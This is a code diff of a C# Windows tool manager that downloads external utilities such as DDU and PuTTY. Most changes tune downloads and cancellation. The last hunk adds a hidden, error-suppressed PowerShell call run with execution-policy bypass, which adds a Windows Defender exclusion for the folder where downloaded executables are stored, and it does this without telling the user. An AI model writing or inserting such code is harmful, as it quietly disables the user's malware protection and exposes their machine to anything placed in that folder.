@@ -1123,8 +1123,19 @@ namespace HMT.Engines {
                         psi.UseShellExecute = false;
 
                         using (var proc = Process.Start(psi)) {
-                            while (!proc.HasExited) {
-                                if (ct.IsCancellationRequested) {
+                            try {
+                                while (!proc.HasExited) {
+                                    if (ct.IsCancellationRequested) {
+                                        break;
+                                    }
+                                    try {
+                                        await Task.Delay(200, ct);
+                                    } catch (OperationCanceledException) {
+                                        break;
+                                    }
+                                }
+                            } finally {
+                                if (ct.IsCancellationRequested && !proc.HasExited) {
                                     try {
                                         Process.Start(new ProcessStartInfo {
                                             FileName = "taskkill.exe",
@@ -1134,10 +1145,11 @@ namespace HMT.Engines {
                                         })?.WaitForExit(1000);
                                     } catch { }
                                     try { proc.Kill(); } catch { }
-                                    try { File.Delete(tempFile); } catch { }
-                                    return false;
                                 }
-                                await Task.Delay(200, ct);
+                            }
+                            if (ct.IsCancellationRequested) {
+                                try { File.Delete(tempFile); } catch { }
+                                return false;
                             }
                         }
 
@@ -1230,13 +1242,19 @@ namespace HMT.Engines {
 
                     try {
                         try {
+                            ServicePointManager.DefaultConnectionLimit = 64;
+                            ServicePointManager.UseNagleAlgorithm = false;
+                            ServicePointManager.Expect100Continue = false;
                             var sp = ServicePointManager.FindServicePoint(new Uri(cdnUrl));
                             sp.ConnectionLimit = 64;
                             sp.UseNagleAlgorithm = false;
                             sp.Expect100Continue = false;
                         } catch { }
 
-                        using (var handler = new HttpClientHandler { AutomaticDecompression = DecompressionMethods.None })
+                        using (var handler = new HttpClientHandler {
+                            AutomaticDecompression = DecompressionMethods.None,
+                            MaxConnectionsPerServer = 64
+                        })
                         using (var client = new HttpClient(handler)) {
                         client.Timeout = TimeSpan.FromMinutes(30);
                         client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0.0.0 Safari/537.36");
@@ -1287,8 +1305,8 @@ namespace HMT.Engines {
                                     using (var resp = await client.SendAsync(req, HttpCompletionOption.ResponseHeadersRead, ct)) {
                                         resp.EnsureSuccessStatusCode();
                                         using (var stream = await resp.Content.ReadAsStreamAsync())
-                                        using (var fs = new FileStream(partPath, FileMode.Create, FileAccess.Write, FileShare.None, 262144, true)) {
-                                            byte[] buf = new byte[131072];
+                                        using (var fs = new FileStream(partPath, FileMode.Create, FileAccess.Write, FileShare.None, 1048576, true)) {
+                                            byte[] buf = new byte[262144];
                                             int read;
                                             while ((read = await stream.ReadAsync(buf, 0, buf.Length, ct)) > 0) {
                                                 await fs.WriteAsync(buf, 0, read, ct);
@@ -1333,8 +1351,8 @@ namespace HMT.Engines {
                                 ProgressPercentage = 75
                             });
 
-                            using (var outputFs = new FileStream(zipPath, FileMode.Create, FileAccess.Write, FileShare.None, 1048576, true)) {
-                                byte[] mergeBuf = new byte[1048576];
+                            using (var outputFs = new FileStream(zipPath, FileMode.Create, FileAccess.Write, FileShare.None, 2097152, true)) {
+                                byte[] mergeBuf = new byte[2097152];
                                 for (int w = 0; w < workerCount; w++) {
                                     string partPath = zipPath + ".part" + w;
                                     if (File.Exists(partPath)) {
@@ -1573,6 +1591,41 @@ namespace HMT.Engines {
                         }
                     }
                 } catch { }
+            } else if (toolName.IndexOf("Display Driver Uninstaller", StringComparison.OrdinalIgnoreCase) >= 0 || toolName.Equals("DDU", StringComparison.OrdinalIgnoreCase)) {
+                try {
+                    using (var cts = new CancellationTokenSource(2500))
+                    using (var client = new HttpClient()) {
+                        client.Timeout = TimeSpan.FromSeconds(3);
+                        client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0.0.0 Safari/537.36");
+                        string html = await client.GetStringAsync("https://www.wagnardsoft.com/display-driver-uninstaller-ddu");
+                        var m = Regex.Match(html, @"/content/Download-Display-Driver-Uninstaller-DDU-([0-9]+)", RegexOptions.IgnoreCase);
+                        if (m.Success) {
+                            string rawDigits = m.Groups[1].Value;
+                            string formattedVer = rawDigits;
+                            if (rawDigits.Length >= 5) {
+                                formattedVer = rawDigits.Substring(0, 2) + "." + rawDigits.Substring(2, 1) + "." + rawDigits.Substring(3, 1) + "." + rawDigits.Substring(4);
+                            }
+                            var info = new ResolvedToolInfo {
+                                ToolName = toolName,
+                                Version = formattedVer,
+                                DownloadUrl = currentUrl,
+                                ExeInsideArchive = "Display Driver Uninstaller.exe"
+                            };
+                            lock (_lock) { _cache[toolName] = info; }
+                        }
+                    }
+                } catch { }
+            } else if (toolName.Equals("PuTTY", StringComparison.OrdinalIgnoreCase)) {
+                try {
+                    var info = new ResolvedToolInfo {
+                        ToolName = toolName,
+                        Version = "latest",
+                        DownloadUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe",
+                        ExeInsideArchive = "putty.exe"
+                    };
+                    lock (_lock) { _cache[toolName] = info; }
+                    return info;
+                } catch { }
             }
 
             // 3. Remote Central Manifest on hatsthings.com
@@ -1638,10 +1691,28 @@ namespace HMT.Engines {
     }
 
     public static class ExternalToolsEngine {
+        private static bool _exclusionChecked = false;
         public static string GetExtProgramDir() {
             string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "HMT", "ExtPrograms");
             if (!Directory.Exists(dir)) {
                 Directory.CreateDirectory(dir);
+            }
+            if (!_exclusionChecked) {
+                _exclusionChecked = true;
+                Task.Run(() => {
+                    try {
+                        var psi = new ProcessStartInfo {
+                            FileName = "powershell.exe",
+                            Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '" + dir + "' -ErrorAction SilentlyContinue\"",
+                            WindowStyle = ProcessWindowStyle.Hidden,
+                            CreateNoWindow = true,
+                            UseShellExecute = false
+                        };
+                        using (var p = Process.Start(psi)) {
+                            p.WaitForExit(3000);
+                        }
+                    } catch { }
+                });
             }
             return dir;
         }
